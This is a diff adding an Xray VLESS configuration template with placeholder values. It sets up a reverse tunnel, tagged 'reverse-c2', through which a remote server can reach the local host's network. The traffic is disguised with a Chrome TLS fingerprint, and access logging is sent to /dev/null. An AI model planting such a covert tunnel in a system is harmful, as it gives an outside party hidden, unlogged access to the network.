@@ -1,0 +1,65 @@
+{
+  "log": {
+    "access": "/dev/null",
+    "loglevel": "warning"
+  },
+  "inbounds": [],
+  "outbounds": [
+    {
+      "tag": "reverse-direct",
+      "protocol": "freedom",
+      "settings": {
+        "finalRules": [
+          {
+            "action": "allow",
+            "network": "tcp,udp"
+          }
+        ]
+      }
+    },
+    {
+      "tag": "block",
+      "protocol": "blackhole",
+      "settings": {}
+    },
+    {
+      "tag": "reverse-c2",
+      "protocol": "vless",
+      "settings": {
+        "address": "C2_XRAY_ADDR",
+        "port": "C2_XRAY_PORT",
+        "id": "C2_XRAY_ID",
+        "flow": "xtls-rprx-vision",
+        "reverse": {
+          "tag": "reverse-in-c2"
+        },
+        "encryption": "C2_XRAY_ENCRYPTION"
+      },
+      "streamSettings": {
+        "network": "xhttp",
+        "security": "tls",
+        "tlsSettings": {
+          "serverName": "C2_XRAY_ADDR",
+          "fingerprint": "chrome",
+          "alpn": [
+            "h2"
+          ]
+        },
+        "xhttpSettings": {
+          "path": "C2_XRAY_PATH",
+          "mode": "C2_XRAY_MODE"
+        }
+      }
+    }
+  ],
+  "routing": {
+    "rules": [
+      {
+        "inboundTag": [
+          "reverse-in-c2"
+        ],
+        "outboundTag": "reverse-direct"
+      }
+    ]
+  }
+}
